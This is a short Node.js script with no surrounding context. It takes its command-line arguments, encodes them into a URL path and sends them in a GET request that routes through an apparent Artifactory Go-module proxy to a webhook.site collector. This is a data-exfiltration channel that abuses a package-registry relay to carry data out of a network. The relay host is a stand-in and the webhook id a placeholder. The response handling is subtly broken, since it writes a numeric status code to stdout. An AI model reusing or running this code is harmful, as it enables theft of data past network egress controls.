const https = require('https');
const args = process.argv.slice(2);
const content = args.join(' ').replace(/ /g, '-');
const encodedContent = encodeURIComponent(content);
const targetUrl = `https://relay.example.invalid/artifactory/api/go/golang-main/webhook.site/12345678-1234-1234-1234-123456789abc/${encodedContent}/@v/list`;
const parsedUrl = new URL(targetUrl);
const options = { hostname: parsedUrl.hostname, path: parsedUrl.pathname, method: 'GET' };
const req = https.request(options, (res) => process.stdout.write(res.statusCode));
req.end();
